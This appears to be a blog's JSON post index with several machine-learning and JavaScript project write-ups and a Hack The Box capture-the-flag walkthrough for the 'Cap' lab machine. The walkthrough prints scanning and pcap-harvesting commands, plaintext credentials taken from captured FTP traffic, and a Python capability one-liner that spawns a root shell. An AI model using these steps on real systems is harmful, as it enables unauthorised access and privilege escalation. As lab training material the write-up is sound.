[ { "title": "Dog Breed Identification Using Neural Networks", "url": "/posts/breed-id/", "categories": "Projects", "tags": "python, pytorch", "date": "2022-06-03 00:12:11 -0700", "snippet": "Created by: Armand Mousavi (amousavi@cs), Vivek Patel (vivekp@cs), and Albert Zhong (azhong@cs)UW student project for CSE455 22spVideoAbstract and BackgroundFGIC (Fine-Grained Image Classification) is a core problem in modern machine learning research and the discipline of computer vision in particular. The use of image data that is labeled for the purposes of predicting an attribute that is categorical seems clear at first, but presents a huge challenge when considering the amount of possible labels that can be assigned in addition to the distribution of data to both train and test approaches on.Neural networks (and more specifically, convolutional neural networks) are a key tool used in tackling fine-grained image classification problems. A general neural network architecture for image classification usually involves taking a preprocessed input (common transformations include square-cropping, rotations and zooms on image data to prevent overfitting) and then convolving, activating, and pooling the results to then transform the input into a different shape as to learn higher-order features present in the data. This smaller portion is then often repeated some number of times before one or more fully connected layers with a softmax-esque activation function that yields what can be considered output probabilities for each class of the dependent variable. An example image is presented below.[Source]Problem StatementOur goal is to evaluate multiple common image classification networks that are more general on their ability to perform dog breed identification on the Stanford Dogs Dataset.Data SourceAs mentioned above, we utilized the Stanford Dogs Dataset. It features 20850 images total across 120 dog breeds. There are roughly 150 images per dog breed in the dataset, a fairly even distribution, with some variation around that number.MethodologyIn general, the workflow we mentioned in the abstract and background section follows in the approaches we took for our work here. Gather Dataset Preprocess Training/Validation/Test Datasets Cropping Flipping Rotation Train Evaluate PerformanceWe compared a few different common general models for image classification: ResNet-34 ResNet-50 Inception-v3We leveraged pretrained weights made available by PyTorch, but had to modify the networks to support predictions across 120 labels (the number of different breeds in the dataset). We took the fully-connected layers at the end of each network and removed them, replacing them with layers that have 120 outputs. From there, our training code takes the argmax over the output layer and deems that as the prediction made by the neural network in question.Experimental Setup and ResultsThe full training and testing code we used to comapre the models can be viewed in our Colab notebook here.For each network we trained against the dataset, we generated plots for Training Loss vs. Epoch and Validation Loss vs. Epoch. We utilized a 70-15-15 split for training, validation, and testing. All models were trained for 15 epochs of stochastic gradient descent with a learning rate of 0.01, momentum of 0, and weight decay of 0.0001.The models we tested performed as follows:ResNet-34The resulting accuracy for the network on the test set was roughly 75.6%.ResNet-50The resulting accuracy for the network on the test set was roughly 79.68%.Inception-v3The resulting accuracy for the network on the test set was roughly 70.88%.ChallengesThe main challenges came down to working with PyTorch to write clean, modularized code for plotting, training, and reshaping the output layer(s) of each network we intended to test against the dataset in question.In particular, the use of Inception-v3 proved to require a fair bit of debugging due to the fact that Inception-v3 has an auxiliary output layer that we had failed to recognize when we were selecting networks to train. The usual flow for changing the output layer to reflect the number of labels obviously neglected that layer, and as such we needed to change our training code to grab those outputs in order to have the destination variable match the shape of the output coming from the network. Moreover, a separate set of preprocessing transforms needed to be defined as the input sizes to the network were 299x299 as opposed to the 227x227 that both ResNet models took in.Final ThoughtsIn general, it’s no surprise that the pretrained weights for general image recognition were able to perform well in a generic classification environment. In general, it seems that under controlled hyperparameters of training, deeper architectures such as ResNet-50 with more physical weights that affect classification yield better results. If we were to repeat such an experiment in the future, we’d definitely look into resources for longer training, where we free the weights on the pretrained networks and have gradient descent perturb the weights across the entirety of the networks." }, { "title": "GalaxyGAN", "url": "/posts/galaxygan/", "categories": "Projects", "tags": "python, keras", "date": "2021-12-11 23:12:11 -0800", "snippet": "GalaxyGANCreated by: Armand Mousavi, Karman Singh, and Matthew FossUW student project for CSE490G1Try the demo out for yourselfVideoAbstract/BackgroundA Generative Adversarial Network can be broken down into three parts: learn a generative model, train a model in an adversarial setting, and use deep neural networks. In a GAN there is the generator and the discriminator. The Generator creates fake images to input into the discriminator. The discriminator takes two images, one real and one fake. The discriminator’s job is to decide whether the image is fake or real. The generative model tries to maximize the probability of fooling the discriminator while the discriminator tries to maximize the probability of the sample being from the real dataset. Pictured below is a basic representation of a GAN, credit fromsourceThe GalaxyGAN implementation follows this methodology. GalaxyGAN was designed to create fake images to fool the discriminator.Problem statementWe want to see if we can use a Generative Adversarial Network to produce new images of fake galaxies using a comprehensive dataset of colored galaxy images and do it in a way that we didn’t have to train the model for more than a couple days.Related workWe talked about using GAN and the best ways to utilize this network. We searched many different websites with datasets. The dataset we used was a relatively large set of galaxy images called Galaxy10 DECals from this website. The Galaxy10 DECals is an improved version of Galaxy10. The Galaxy10 dataset was created with the Galaxy Zoo data release where volunteers classified around 270K of Sloan Digital Sky Survey, SDSS, galaxy images. GZ later utilized DESI Legacy Imaging Surveys to create the new and improved version Galaxy10 DECals.Galaxy10 dataset (17736 images) Class 0 (1081 images): Disturbed Galaxies Class 1 (1853 images): Merging Galaxies Class 2 (2645 images): Round Smooth Galaxies Class 3 (2027 images): In-between Round Smooth Galaxies Class 4 ( 334 images): Cigar Shaped Smooth Galaxies Class 5 (2043 images): Barred Spiral Galaxies Class 6 (1829 images): Unbarred Tight Spiral Galaxies Class 7 (2628 images): Unbarred Loose Spiral Galaxies Class 8 (1423 images): Edge-on Galaxies without Bulge Class 9 (1873 images): Edge-on Galaxies with Bulge MethodologyWe referred to the tutorials for guidance from here and from here.Before working with the data for the final model we downsized all of the images from the original dataset. The 256x256 images required a larger model that took an extreme amount of time to train on and more RAM than we had available on colab to comfortably work with.We first define the discriminator model, which needs to take a sample image from our dataset as input and output a classification prediction as to whether the sample is real or fake. The inputs are three color channels and 128 by 128 pixels in size. The model has a normal convolutional layer followed by five convolutional layers using a stride of 2 by 2 to downsample the input image. The model has no pooling layers and a single node in the output layer with the sigmoid activation function to predict whether the input sample is real or fake. The model is trained to minimize the binary cross entropy loss function, which is suitable for binary classification. We use the industry best practice with the LeakyReLU instead of ReLU, and the Adam version of stochastic gradient descent with a learning rate of 0.0002 and a momentum of 0.5The generator model is responsible for creating new, but fake images and does this by taking a point from the latent space as input and outputting a square color image. We don’t want just one low-resolution version of the image, but many parallel interpretations of the input. So, the first hidden layer, the Dense layer, needs enough nodes for multiple versions of the output image, such as 256. The activations from these nodes can be reshaped into an image shape to pass into the convolutional layer, such as 256 different 4 by 4 feature maps. Now we need to upsample the low-resolution image to a higher resolution version of the image. We will use Conv2DTranspose to reverse pool and convolute. We configure the Conv2DTranspose layer with stride of 2 by 2 and quadruple the area of the input feature maps by doubling the width and height. We up sample five times to reach the required output image size of 128 by 128. We use the LeakyReLU activation function again as best practice for training GAN models. The output layer of the model is a Conv2D with three filters for the required three channels and kernel size of 3 by 3. Finally a tanh activation is used to ensure the output values are in the range [-1, 1].For generating real samples, we will just take the training dataset and select a random subsample of images. We need to generate new points in the latent space and the array of random numbers then reshape into samples, which are then used as input to the generator model. We need to generate images composed of random pixel values for the generate fake samples function, which takes in the generator model as an argument.Here you can see the full model for the discriminator:As well as the model for the generator:Experiments/evaluationYou can check out our final notebook we used to train our model hereWhen evaluating the Generative Adversarial Network, there isn’t really an objective error score for the generated images. The images will need to subjectively be evaluated. Also the adversarial nature of the training means the generator is changing after each batch and the subjective quality of the images may improve or degrade with further updates. To handle this, first we periodically evaluate the classification accuracy of the discriminator on real and fake images, second we periodically generate many images and save them for review, and third we periodically save the generator model. If we train the GAN over many epochs, we would be able to get many snapshots of the model and choose the best models, once reviewed for performance.We define a function for summarizing the performance of the discriminator model. This function takes a sample of real galaxy images and generates the same number of fake galaxy images with the generator model and then evaluates the classification accuracy of the discriminator model and reports the score for each sample.This is an example of the loss values on real images and fake generated images for the discriminator and the generator for epoch 26&amp;gt;26, 1/138, d1=0.29638204, d2=0.32488263 g=3.45844007&amp;gt;26, 2/138, d1=0.45061448, d2=0.88800186 g=4.71526003&amp;gt;26, 3/138, d1=1.16259015, d2=0.06006718 g=4.13229275&amp;gt;26, 4/138, d1=0.72051704, d2=0.09301022 g=2.78597784&amp;gt;26, 5/138, d1=0.81719440, d2=0.22286285 g=2.34299660 … … …&amp;gt;26, 134/138, d1=1.59510779, d2=0.09820783 g=2.37885666&amp;gt;26, 135/138, d1=0.35758907, d2=0.54601729 g=2.40457916&amp;gt;26, 136/138, d1=0.22124308, d2=0.10850765 g=2.61518002&amp;gt;26, 137/138, d1=0.18373565, d2=0.13180479 g=2.34858227&amp;gt;26, 138/138, d1=0.02594333, d2=0.20959115 g=2.79657221This is an example of the model’s accuracy score for epoch 26 based on the discriminators ability to differentiate&amp;gt;Accuracy real: 94%, fake: 100%This is an example of the image produced by the model for epoch 26ResultsEpoch 11Epoch 12Epoch 13Epoch 14Epoch 15The results after the first training process for 15 epochs yielded the following results and we can see that the quality of the images are not consecutively increasing and from my understanding, Epoch 13 out of the last five epochs had the best result with the least amount of noise in comparison to the colorful galaxy center. At this stage the galaxy isn’t very detailed and more like a cloud of color, with a ton of noise and repetition of small sections, introducing patterns.Epoch 41Epoch 42Epoch 43Epoch 44And finally…Epoch 45These are the results after the second training process for an additional 35 epochs. We can see that the quality does get better and there is more detail but we can see issues with repeated patterns in Epoch 41 and 42. The last three are fairly good representations of galaxies, where Epoch 43 has a very clean image, with a detailed galaxy center with little outside noise. Epoch 44 has a bit of a problem with the patterns of the outside of the galaxy with the red spots but the galaxy center is really rich in color and detail. Epoch 45 is the combination of the last two, where the center is colorful and clear and the surrounding is pretty clean with minimal noise.Final ThoughtsWith more time we would definitely continue training this network, maybe on some persistent computer for at least a week. This would also allow us to attempt to generate original sized images at 256x256. It would also be wise for us to try new models like to add batch normalization layers to the layers of the discriminator which is quite easy with keras.Thank you again to the whole team and to you for reading our report." }, { "title": "Trash Material Identifier", "url": "/posts/trash-identification/", "categories": "Projects", "tags": "ML, python, fastai, CV, NN, colab, pythoneverywhere, flask, javascript", "date": "2021-08-28 14:09:30 -0700", "snippet": "Garbage is everywhere. One of the major annoyances we all face when dealing with it is correctly sorting it into it’s proper categories and receptacles. A strong goal for the future is to automate detection of material and then sorting of that material through artificial intelligence and robotics. This weekend I worked on implementing my own neural network using fastai to train on images of various categories of garbage and then be able to classify new images as paper, trash, cardboard, metal, glass, and plastic. After training my network on my google colab, I stored it as a pickle file then transported it to pythoneverywhere where it would be served on a flask server as a web API to identify images that were sent to it. From there I built a simple frontend demo so that a user can upload a local image and have it be sent to the api.The development process was briefly as follows:I used a pre labelled image dataset of garbage which I uploaded to my notebook. Each image is sorted into a folder containing it’s label so I rearranged the data into train, validation, and test sets so that I could begin the machine learning process with it.## move files to destination folders for each waste typefor waste_type in waste_types: source_folder = os.path.join(&#39;dataset-resized&#39;,waste_type) train_ind, valid_ind, test_ind = split_indices(source_folder,1,1) ## move source files to train train_names = get_names(waste_type,train_ind) train_source_files = [os.path.join(source_folder,name) for name in train_names] train_dest = &quot;data/train/&quot;+waste_type move_files(train_source_files,train_dest) ## move source files to valid valid_names = get_names(waste_type,valid_ind) valid_source_files = [os.path.join(source_folder,name) for name in valid_names] valid_dest = &quot;data/valid/&quot;+waste_type move_files(valid_source_files,valid_dest) ## move source files to test test_names = get_names(waste_type,test_ind) test_source_files = [os.path.join(source_folder,name) for name in test_names] ## I use data/test here because the images can be mixed up move_files(test_source_files,&quot;data/test&quot;)I created a new convolutional neural network learner through the fastai library using the pretrained resnet50 library as the beginning of the network. I would have used a larger network like resnet152 but I needed to keep my network small to fit within pythoneverywhere’s limits.learn = cnn_learner(data,models.resnet50,metrics=error_rate)I searched the most effective learning rate on the first epoch as 5e-03. This is chosen as around the center of the main descent of this graph between loss and learning rate:I ran the network for 40 epochs and eventually reached a 95% accuracy on the validation and then testing set after less than an hour.learn.fit_one_cycle(40,max_lr=5e-03)At the end, you can see that the confusion matrix was not too confused.I exported my learner using learn.export() and then uploaded it to my new pythoneverywhere project where I also had my Flask server:from flask import Flaskfrom flask import requestfrom flask_cors import CORS, cross_originfrom fastai.vision import load_learnerfrom fastai.vision import open_imageapp = Flask(__name__)model = load_learner(&#39;&#39;)cors = CORS(app, resources={r&quot;/&quot;: {&quot;origins&quot;: &quot;*&quot;}})app.config[&#39;CORS_HEADERS&#39;] = &#39;Content-Type&#39;@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])@cross_origin()def tia(): if request.method == &#39;GET&#39;: return &quot;hello&quot; img = request.files[&#39;garbage&#39;] what, _, prob = model.predict(open_image(img)) return str(what)if __name__ == &#39;__main__&#39;: app.run()I allowed all sources to call the API as no special request is ever transported or triggered. Then I called the API using a simple XMLHttpRequest through an HTML form in javascript on my demo:function formSubmit(event) { var url = &quot;https://inzombakura.pythonanywhere.com/&quot;; var request = new XMLHttpRequest(); request.open(&#39;POST&#39;, url); submitBtn.innerText = &quot;Loading&quot;; submitBtn.style.cursor = &quot;auto&quot;; request.onload = function() { // request successful // we can use server response to our request now if (request.status === 200) { labelText.innerText = request.responseText; } submitBtn.innerText = &quot;Submit&quot;; submitBtn.style.cursor = &quot;pointer&quot;; }; request.onerror = function() { labelText.innerText = &quot;Unidentified&quot;; submitBtn.innerText = &quot;Submit&quot;; submitBtn.style.cursor = &quot;pointer&quot;; }; request.send(new FormData(event.target)); // create FormData from form that triggered event event.preventDefault();}Again you try out my demo and inspect the rest of the code for yourself here." }, { "title": "Drawing With Light", "url": "/posts/drawing-with-light/", "categories": "Projects", "tags": "javascript, canvas", "date": "2021-08-22 10:09:30 -0700", "snippet": "This weekend I worked on a way of drawing on the HTML5 canvas that would simulate what it would be like to draw with a flashlight on a 2D plane. Written purely in javascript, you can try out the demo here.Using an event listener for input fields, you can adjust the RGB value of the light along with the polygonal opacity and degrees of the light.// Grab all the input fieldsvar inputAll = document.querySelectorAll(&#39;input[type=&quot;range&quot;]&#39;);// Loop through all of the input fields to listen for each input slidefor (i = 0; i &amp;lt; inputAll.length; i++) { // Listen for the change/slide on each input inputAll[i].addEventListener(&#39;input&#39;, function(r, g, b, o, d){ // Get the value for the input fields r = red.value; b = blue.value; g = green.value; o = op.value; d = deg.value; range = d * (Math.PI/180); if (o == 10) { light = &#39;rgba(&#39; + r + &#39;,&#39; + g + &#39;,&#39; + b + &#39;,1)&#39;; } else { light = &#39;rgba(&#39; + r + &#39;,&#39; + g + &#39;,&#39; + b + &#39;,&#39; + &#39;.&#39; + o + &#39;)&#39;; } bg.style.backgroundColor = light; bg.style.opacity = o; colorOutput.innerHTML = light; degreeOutput.innerHTML = d + &#39; degrees&#39;; });}The light cast from the first place you click to the direction of your mouse pointer, a polygon consisting of every point visible to that flashlight is drawn. This is done by casting two rays that span your flashlight’s FOV. Then checking for all vertices of pre made shapes within that FOV as well as intersections of those two rays made from the flashlights range. var direction = Math.atan2(Mouse.y-MouseStart.y,Mouse.x-MouseStart.x); if (direction &amp;gt;= Math.PI / 2 || direction &amp;lt;= -Math.PI / 2) { direction = normalizeAngle(direction); } var startAngle = direction - range / 2; var endAngle = direction + range / 2;There is a lot more to it and you can feel free to inspect the code to find out more as well as use any of it in your own projects. For now, I hope you like playing around with it." }, { "title": "Hack The Box Writeup: Cap", "url": "/posts/cap-writeup/", "categories": "CTF", "tags": "htb, web, privesc, network", "date": "2021-07-29 00:12:11 -0700", "snippet": "Port ScanFirst run an nmap scan with service enumeration, default scripts, and OS identification.nmap 10.10.10.245 -sV -sC -OWhich gives the following output:PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)| 256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)|_ 256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)80/tcp open http gunicorn| fingerprint-strings: ...|_http-server-header: gunicorn|_http-title: Security Dashboard...Network Distance: 2 hopsService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelThere are three open ports at this address. An FTP server on port 21, SSH server on port 22, and an HTTP server on port 80. The HTTP server is running Gunicorn which is Python web server similar to Flask.Web EnumerationLets hop into a browser and check out the web server. Visiting it, we see there are 4 tabs we can visit. 10.10.10.245A visual representation of security events, failed login attempts, and port scans over the last 24 hours at this ip address. 10.10.10.245/data/0Pressing the second tab for the security snapshot goes to /capture. This in turn redirects to /data/ followed by a number. We can manually change this to 0 or any other number. On this page we can also download a pcap file corresponding to this number.Presumably we will need to investigate some of these pcap files with Wireshark as the name of the box is “Cap”. Also note that pressing download redirects to /download/0. This way we can download pcap files directly from a url including indices which are missing data pages like at /data/9. 10.10.10.245/ipThe output of the ip shell command at 10.10.10.245 10.10.10.245/netstatThe output of the netstat shell command at 10.10.10.245After investigation, it seems that the incrementing numbers after /data/ represent portions of the network log in chronological order. Lets start at 10.10.10.245/download/0 and download 0.pcap all the way to 10.10.10.245/download/25 for 25.pcap so we can read any part of the log with Wireshark. This can be done with this simple curl one liner:curl http://10.10.10.245/download/[0-25] -OPacket AnalysisFirst, let’s open 0.pcap from Wireshark.Sorting the packets by protocol and examining the FTP traffic we can immediately see an unencrypted FTP login.From this traffic we get the following username and password to login to the FTP server. USER nathanPASS Buck3tH4TF0RM3!We can also see that this same user retrieved a file named notes.txt before the log ends.FTP EnumerationLogin to the ftp server withftp 10.10.10.245Then entering nathan’s username and password we succesfully logged in! In nathan’s home directory there is a file called user.txt which holds the first flag for HTB. f8ee4208619dd70ee616d7cd81628906To get a shell, lets try to connect to ssh server that is running with the same credentialsssh nathan@10.10.10.245 ... Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64) ... nathan@cap:~$ ls linpeas.sh ls.txt snap user.txt user2.txtSomebody else conveniently already downloaded linpeas.sh so we can do linux enumeration without having to scp that.Linux Privilege EscalationTo get linpeas.sh if it is not already on this system, run the scp command using nathan’s account then ssh in on port 22../linpeas.shOne interesting line in the enumeration results is: /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eipIt seems that this python binary has the capability to set the user id to root. We can do this by running python code which sets the uid then executes a new shell./usr/bin/python3.8 -c &#39;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#39;And now we are root!The last flag is located at /root/root.txtcat root.txt e516cb179c03e3c916f04f2acef5b4bcWith that, we have pwned this machine" } ]
